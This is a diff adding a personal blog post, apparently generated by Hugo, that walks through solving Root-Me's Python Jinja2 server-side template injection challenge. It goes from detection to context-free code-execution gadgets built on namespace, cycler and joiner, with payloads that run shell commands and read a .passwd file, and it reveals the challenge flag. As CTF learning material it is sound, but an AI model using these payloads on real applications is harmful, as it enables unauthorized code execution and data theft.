@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en-US"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">From Detection to Flag: Python Jinja2 SSTI on Root-Me | Satish&#39;s Scribbles</title>
+<meta property="og:title" content="From Detection to Flag: Python Jinja2 SSTI on Root-Me | Satish&#39;s Scribbles" />
+<meta name="twitter:title" content="From Detection to Flag: Python Jinja2 SSTI on Root-Me | Satish&#39;s Scribbles" />
+<meta itemprop="name" content="From Detection to Flag: Python Jinja2 SSTI on Root-Me | Satish&#39;s Scribbles" />
+<meta name="application-name" content="From Detection to Flag: Python Jinja2 SSTI on Root-Me | Satish&#39;s Scribbles" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A step-by-step walkthrough of solving a Python SSTI challenge on Root-Me, from initial detection to crafting a context-free Jinja2 payload for code execution.">
+<meta itemprop="description" content="A step-by-step walkthrough of solving a Python SSTI challenge on Root-Me, from initial detection to crafting a context-free Jinja2 payload for code execution." />
+<meta property="og:description" content="A step-by-step walkthrough of solving a Python SSTI challenge on Root-Me, from initial detection to crafting a context-free Jinja2 payload for code execution." />
+<meta name="twitter:description" content="A step-by-step walkthrough of solving a Python SSTI challenge on Root-Me, from initial detection to crafting a context-free Jinja2 payload for code execution." />
+
+<meta property="og:locale" content="en-US" />
+<meta name="language" content="en-US" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/post/rootme-jinja2-ssti-walkthrough/" title="en-US 🇺🇸" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.150.0">
+
+    
+    <meta property="og:url" content="http://localhost:1313/post/rootme-jinja2-ssti-walkthrough/">
+  <meta property="og:site_name" content="Satish&#39;s Scribbles">
+  <meta property="og:title" content="From Detection to Flag: Python Jinja2 SSTI on Root-Me">
+  <meta property="og:description" content="A step-by-step walkthrough of solving a Python SSTI challenge on Root-Me, from initial detection to crafting a context-free Jinja2 payload for code execution.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-09-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-09-11T00:00:00+00:00">
+    <meta property="article:tag" content="SSTI">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Jinja2">
+    <meta property="article:tag" content="Root-Me">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="og:image" content="http://localhost:1313/images/share.webp">
+        <meta property="fb:admins" content="0000000000">
+
+
+    
+    
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/share.webp">
+  <meta name="twitter:title" content="From Detection to Flag: Python Jinja2 SSTI on Root-Me">
+  <meta name="twitter:description" content="A step-by-step walkthrough of solving a Python SSTI challenge on Root-Me, from initial detection to crafting a context-free Jinja2 payload for code execution.">
+      <meta name="twitter:site" content="@www.x.com/alt_maximus">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/post/rootme-jinja2-ssti-walkthrough/">
+    <link href="/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blog/">
+                        Blog
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/contact/">
+                        Contact
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">From Detection to Flag: Python Jinja2 SSTI on Root-Me</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2025-09-11T00:00:00&#43;00:00" itemprop="datePublished"> Thursday, Sep 11, 2025 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>I recently tackled a fun Server-side Template Injection (SSTI) challenge on Root-Me and wanted to document my process. This post follows my journey from initial detection to crafting a reliable, context-free payload to gain code execution.</p>
+<h2 id="the-challenge-python-ssti-introduction">The Challenge: Python SSTI Introduction</h2>
+<p>The goal was to solve the &ldquo;Python - Server-side Template Injection Introduction&rdquo; challenge on <a href="https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction?lang=en">Root-me.org</a>.</p>
+<h3 id="-setup-">&laquo; SETUP &raquo;</h3>
+<p>I started by loading the challenge environment and intercepting the requests using Caido. The application allows you to preview content submitted through a form.</p>
+<h3 id="-detect-">&laquo; DETECT &raquo;</h3>
+<p>The core of the application is a POST request to <code>/preview</code> with <code>title</code> and <code>content</code> parameters.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln">1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/preview</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">challenge01.root-me.org:59074</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">27</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">
+</span></span><span class="line"><span class="ln">6</span><span class="cl">title=hi&amp;content=hi&amp;button=yes
+</span></span></code></pre></div><p>To test for SSTI, I sent a simple mathematical expression, <code>{{7*7}}</code>, in both the <code>title</code> and <code>content</code> fields. The server&rsquo;s response was revealing:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="nt">&#34;content&#34;</span><span class="p">:</span> <span class="s2">&#34;49&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nt">&#34;title&#34;</span><span class="p">:</span> <span class="s2">&#34;{{7*7}}&#34;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>content</code> field was processed, while the <code>title</code> field was not. This confirmed an SSTI vulnerability in the <code>content</code> parameter. To be certain about the template engine, I tried two different payloads:</p>
+<ol>
+<li><code>{{3 * 3}}</code> resulted in <code>9</code>.</li>
+<li><code>{{'3' * 3}}</code> resulted in <code>333</code>.</li>
+</ol>
+<p>This behavior is characteristic of Jinja2, confirming my suspicion.</p>
+<h3 id="-explore-">&laquo; EXPLORE &raquo;</h3>
+<p>With the vulnerability confirmed, the next step was to find a way to execute shell commands. My goal was to access the <code>os</code> module in Python.</p>
+<h4 id="the-problem-with-context-dependent-payloads">The Problem with Context-Dependent Payloads</h4>
+<p>In previous challenges, like one from picoCTF, I had used &ldquo;egg hunter&rdquo; payloads that depend on the application&rsquo;s context. For example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">356</span><span class="p">](</span><span class="s1">&#39;ls -la&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="p">}}</span>
+</span></span></code></pre></div><p>The problem with this method is that the index for <code>popen</code> (<code>[356]</code>) is not consistent across different environments. It&rsquo;s a brittle approach. I wanted to find a more reliable, context-independent payload.</p>
+<h4 id="the-quest-for-a-context-free-payload">The Quest for a Context-Free Payload</h4>
+<p>I drew inspiration from the GreHack 2021 talk by @podalirius_, &ldquo;<a href="https://www.youtube.com/watch?v=ahBxZkOTdg0">Optimizing Server Side Template Injections payloads for jinja2</a>&rdquo;, which discusses creating context-free payloads.</p>
+<p>The ideal payload should be:</p>
+<ol>
+<li><strong>Context-free:</strong> It shouldn&rsquo;t rely on any data passed into the <code>.render()</code> method.</li>
+<li><strong>Short:</strong> Shorter is always better.</li>
+</ol>
+<p>The key is the <code>self</code> object, which is a reference to the template itself and is accessible even with an empty <code>.render()</code> call.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Template</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;I am {{ self }}&#34;&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s1">&#39;I am &lt;TemplateReference None&gt;&#39;</span>
+</span></span></code></pre></div><p>From this <code>self</code> object, we should be able to find a path to the <code>os</code> module.</p>
+<h4 id="finding-the-path-with-bfs">Finding the Path with BFS</h4>
+<p>Python&rsquo;s objects and attributes can be thought of as a graph. To find the shortest path from our starting object (<code>jinja2</code>) to our target (<code>os</code>), we can use a Breadth-First Search (BFS). This helps avoid long exploration traps and cycles.</p>
+<p>During this exploration, I got a bit confused about the distinction between objects, attributes, and modules in Python. They all felt very similar. I got a great explanation:</p>
+<blockquote>
+<p><strong>You&rsquo;re right to feel they&rsquo;re similar—in Python, almost everything, including modules and functions, is fundamentally an object. The difference lies in their role and relationship to each other.</strong></p>
+<p><strong>Object (obj):</strong> The most basic building block. An instance of a class (e.g., an integer, a list, a function, a module).</p>
+<p><strong>Attribute (attr):</strong> A name that belongs to an object, accessed with the dot notation (<code>parent_object.attribute</code>). It can be a variable or a method.</p>
+<p><strong>Module:</strong> A specific type of object whose main job is to organize Python code, acting as a namespace for its attributes.</p></blockquote>
+<p>With that clarified, I wrote a small BFS script (<code>audit.py</code>) to search for paths from the <code>jinja2</code> object to the <code>os</code> module. It found several promising paths:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">$ ./audit.py jinja2
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Searching <span class="k">for</span> <span class="s1">&#39;os&#39;</span> from <span class="s1">&#39;jinja2&#39;</span> <span class="o">(</span>max depth: 5<span class="o">)</span>...
+</span></span><span class="line"><span class="ln">3</span><span class="cl">jinja2.bccache.fnmatch.os
+</span></span><span class="line"><span class="ln">4</span><span class="cl">jinja2.bccache.os
+</span></span><span class="line"><span class="ln">5</span><span class="cl">jinja2.bccache.tempfile._os
+</span></span><span class="line"><span class="ln">6</span><span class="cl">jinja2.environment.os
+</span></span><span class="line"><span class="ln">7</span><span class="cl">jinja2.loaders.os
+</span></span><span class="line"><span class="ln">8</span><span class="cl">jinja2.utils.os
+</span></span></code></pre></div><p>This confirmed that a path exists. Now, how to get there from <code>self</code>?</p>
+<h4 id="from-self-to-os">From <code>self</code> to <code>os</code></h4>
+<p>First, I inspected the <code>self</code> object using <code>dir()</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Template</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;{{ f(self) }}&#34;&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">f</span><span class="o">=</span><span class="nb">dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s2">&#34;[&#39;__class__&#39;, &#39;__delattr__&#39;, ..., &#39;_TemplateReference__context&#39;]&#34;</span>
+</span></span></code></pre></div><p>Most attributes were internal dunder methods, but <code>_TemplateReference__context</code> looked interesting.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Template</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;{{ self._TemplateReference__context }}&#34;&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s2">&#34;&lt;Context {&#39;range&#39;: ..., &#39;cycler&#39;: &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &#39;joiner&#39;: &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &#39;namespace&#39;: &lt;class &#39;jinja2.utils.Namespace&#39;&gt;} of None&gt;&#34;</span>
+</span></span></code></pre></div><p>This context object gives us access to several Jinja2 utility classes like <code>cycler</code>, <code>joiner</code>, and <code>namespace</code>. My BFS search showed that <code>jinja2.utils.os</code> was a valid path. Since <code>namespace</code> is in <code>jinja2.utils</code>, I could traverse from there to the <code>os</code> module using Python&rsquo;s object introspection capabilities (<code>__init__.__globals__</code>).</p>
+<p>This gives us a reliable path to <code>os</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{{</span> <span class="bp">self</span><span class="o">.</span><span class="n">_TemplateReference__context</span><span class="o">.</span><span class="n">namespace</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span> <span class="p">}}</span>
+</span></span></code></pre></div><p>Even better, since <code>namespace</code>, <code>cycler</code>, and <code>joiner</code> are available in the global context of the template, we can access them directly without referencing <code>self</code>. This leads to a much cleaner and shorter payload.</p>
+<h4 id="the-final-gadgets">The Final Gadgets</h4>
+<p>This discovery yielded three reliable, context-free gadgets for Jinja2 SSTI:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{{</span> <span class="n">namespace</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{{</span> <span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">{{</span> <span class="n">joiner</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span></code></pre></div><h3 id="-exploit-">&laquo; EXPLOIT &raquo;</h3>
+<p>Now it was time to use these gadgets on the challenge server. I sent the payload in the <code>content</code> parameter:</p>
+<pre tabindex="0"><code>content={{ namespace.__init__.__globals__.os.popen(&#34;ls -la&#34;).read() }}
+</code></pre><p>The server responded with a directory listing, and I spotted a <code>.passwd</code> file.</p>
+<h4 id="a-failed-experiment-popen-vs-popen">A Failed Experiment: <code>popen</code> vs. <code>Popen</code></h4>
+<p>To get a nicely formatted output, I first tried to use the <code>communicate()</code> method, which I had used in the past:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{{</span> <span class="n">namespace</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="p">}}</span>
+</span></span></code></pre></div><p>This resulted in an error: <code>TypeError: popen() got an unexpected keyword argument 'shell'</code>.</p>
+<p>This was a key learning moment. I realized I was confusing <code>os.popen()</code> with the more powerful <code>subprocess.Popen</code>. The <code>os.popen</code> function is simpler and doesn&rsquo;t accept those arguments. The payload I used in the picoCTF challenge was accessing <code>subprocess.Popen</code>, not <code>os.popen</code>.</p>
+<h4 id="getting-the-flag">Getting the Flag</h4>
+<p>To solve the formatting issue and read the file, I switched to <code>readlines()</code>, which returns the output as a list of strings, preserving newlines.</p>
+<p><strong>Final Payload:</strong></p>
+<pre tabindex="0"><code>content={{ namespace.__init__.__globals__.os.popen(&#39;cat .passwd&#39;).readlines() }}
+</code></pre><p><strong>Response:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="nt">&#34;content&#34;</span><span class="p">:</span> <span class="s2">&#34;[&#39;Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n&#39;]&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nt">&#34;title&#34;</span><span class="p">:</span> <span class="s2">&#34;hi&#34;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Success! I found the flag.</p>
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>This challenge was a great exercise in moving beyond simple, context-dependent SSTI payloads. The journey was just as important as the result. By hitting a wall with <code>os.popen</code>, taking the time to understand the object graph with BFS, and clarifying fundamental Python concepts, I was able to build a short, reliable, and context-free gadget for code execution. It highlights the importance of deep-diving into the framework you&rsquo;re targeting and not being afraid to go back to the basics.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2025 Satish Patra.
+        
+    </small>
+</footer>
+
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
